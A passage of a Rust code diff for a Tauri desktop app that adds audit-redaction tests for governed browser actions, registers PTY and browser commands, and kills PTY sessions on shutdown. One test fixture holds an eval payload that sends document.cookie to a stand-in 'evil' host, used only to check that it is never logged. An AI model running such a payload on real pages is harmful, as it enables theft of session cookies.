+        assert_eq!(end_dispatch_decision(true, true), (false, true));
+        // A dead session (transport failure) is dropped regardless.
+        assert_eq!(end_dispatch_decision(false, false), (false, false));
+        assert_eq!(end_dispatch_decision(false, true), (false, true));
+    }
+
+    #[test]
+    fn browser_audit_summary_never_leaks_typed_value_or_eval_js() {
+        // The typed value (a possible password) and eval JS (arbitrary code) must
+        // never reach the ledger — only a length/selector does.
+        let typed = BrowserActionInput {
+            op: "interact".into(),
+            kind: Some("type".into()),
+            selector: Some("#password".into()),
+            value: Some("hunter2-supersecret".into()),
+            url: None,
+            what: None,
+            js: None,
+        };
+        let s = browser_audit_summary(&typed);
+        assert!(s.contains("#password"), "selector is shown");
+        assert!(s.contains("19 chars"), "value length is shown");
+        assert!(!s.contains("hunter2"), "the raw typed value must NEVER appear: {s}");
+
+        let evaled = BrowserActionInput {
+            op: "eval".into(),
+            js: Some("fetch('https://evil/'+document.cookie)".into()),
+            url: None,
+            what: None,
+            kind: None,
+            selector: None,
+            value: None,
+        };
+        let e = browser_audit_summary(&evaled);
+        assert!(e.contains("chars"), "eval shows a length");
+        assert!(!e.contains("document.cookie"), "the raw eval JS must NEVER appear: {e}");
+    }
 }
 
 #[cfg_attr(mobile, tauri::mobile_entry_point)]
@@ -2093,6 +3462,8 @@ pub fn run() {
     tauri::Builder::default()
         .plugin(tauri_plugin_dialog::init()) // S-012 native approval dialog
         .manage(Governance(Mutex::new(GateState::default())))
+        .manage(pty::PtyHostState::default()) // R6 Lane-B real-PTY session registry
+        .manage(BrowserHostState::default()) // R6 Lane-C governed CDP browser connection
         .invoke_handler(tauri::generate_handler![
             secure_store_get,
             secure_store_set,
@@ -2110,12 +3481,30 @@ pub fn run() {
             settle_action,
             audit_recent,
             governed_command,
+            pty_spawn,
+            pty_write,
+            pty_resize,
+            pty_kill,
+            browser_discover,
+            browser_connect,
+            browser_disconnect,
+            browser_dispatch,
             mcp_list_servers,
             mcp_add_server,
             mcp_remove_server,
             mcp_list_tools,
             mcp_call_tool
         ])
-        .run(tauri::generate_context!())
-        .expect("error while running the Braavolabs desktop application");
+        .build(tauri::generate_context!())
+        .expect("error while building the Braavolabs desktop application")
+        .run(|app_handle, event| {
+            // App-shutdown hook: kill any live PTY sessions so a vendor CLI child
+            // can't outlive the app (macOS sandbox-exec has no --die-with-parent).
+            // ExitRequested fires when the last window closes / quit is requested.
+            if let tauri::RunEvent::ExitRequested { .. } = event {
+                if let Some(state) = app_handle.try_state::<pty::PtyHostState>() {
+                    state.kill_all();
+                }
+            }
+        });
 }
